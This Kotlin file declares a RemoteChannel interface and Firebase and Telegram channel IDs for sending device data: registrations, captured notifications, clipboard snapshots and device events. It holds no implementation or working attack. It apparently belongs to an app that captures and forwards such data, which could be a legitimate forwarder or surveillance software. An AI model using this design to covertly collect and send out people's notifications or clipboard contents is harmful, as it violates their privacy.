package com.xeg911.shared.data.remote.channel

import com.xeg911.shared.data.model.CapturedNotification
import com.xeg911.shared.data.model.ClipboardSnapshot
import com.xeg911.shared.data.model.DeviceRegistration
import com.xeg911.shared.data.model.event.DeviceEvent

object RemoteChannelIds {
    const val FIREBASE = "firebase"
    const val TELEGRAM = "telegram"
}

/**
 * Outbound transport for device data. Implementations must be safe to call concurrently
 * and must never throw, failures are reported through [Result].
 */
interface RemoteChannel {
    val channelId: String

    suspend fun isEnabled(): Boolean

    suspend fun registerDevice(registration: DeviceRegistration): Result<Unit>

    suspend fun sendNotification(notification: CapturedNotification): Result<Unit>

    suspend fun sendClipboard(snapshot: ClipboardSnapshot): Result<Unit> = Result.success(Unit)

    suspend fun sendEvent(event: DeviceEvent): Result<Unit> = Result.success(Unit)
}
